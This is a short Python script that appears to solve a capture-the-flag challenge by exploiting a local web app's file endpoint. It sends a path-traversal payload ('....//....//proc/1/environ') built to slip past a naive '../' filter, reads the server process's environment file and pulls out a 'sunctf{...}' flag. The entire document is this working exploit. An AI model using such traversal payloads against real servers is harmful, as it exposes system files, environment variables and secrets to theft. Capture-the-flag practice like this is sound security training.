import requests
import re

URL = "http://localhost:5001/file?school=....//....//proc/1/environ"

r = requests.get(URL)

if r.status_code == 200:
    match = re.search(r'sunctf{.*?}', r.text)
    print(match.group())
